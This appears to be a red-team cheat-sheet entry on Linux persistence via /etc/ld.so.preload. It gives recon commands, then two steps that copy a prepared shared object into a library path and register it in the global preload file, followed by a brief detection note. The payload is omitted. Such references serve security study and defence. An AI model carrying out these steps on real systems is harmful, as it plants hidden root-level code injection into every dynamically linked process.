---
technique: ld.so Preload Persistence
category: persistence
targets: Linux Dynamic Loader
protocols: Local
remote_capable: false
tags: linux persistence ld-so preload shared-library
---

# ld.so Preload Persistence

`/etc/ld.so.preload` persistence forces the dynamic loader to load a prepared shared object into dynamically linked processes.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| Root write access | Required to modify `/etc/ld.so.preload` |
| Prepared shared object | Payload construction belongs in a tool note |
| Dynamic binaries | Static binaries do not load shared libraries |

## Linux

### Check preload file

#sh #ld-so #recon

Check whether a global preload file exists.

```sh title:"Check ld.so preload file"
ls -la /etc/ld.so.preload
```
<!-- cheat -->

### Read preload file

#sh #ld-so #recon

Read global preload entries.

```sh title:"Read ld.so preload file"
cat /etc/ld.so.preload
```
<!-- cheat -->

### Step 1: Install preload library

#sh #ld-so #persistence

Copy a prepared shared object into a root-controlled library path.

```sh title:"Install preload library"
cp "$payload_so" "$library_path"
```
<!-- cheat
var payload_so
var library_path
-->

### Step 2: Register preload library

#sh #ld-so #persistence

Append the shared object path to the global preload file.

```sh title:"Register preload library"
printf '%s\n' "$library_path" >> /etc/ld.so.preload
```
<!-- cheat
var library_path
-->

### Test dynamic loader

#sh #ld-so

Run a common dynamic binary to validate loader behavior.

```sh title:"Test dynamic loader preload"
/bin/true
```
<!-- cheat -->

## Detection

Monitor `/etc/ld.so.preload`, new shared objects in library paths, and process-wide load errors after preload changes.
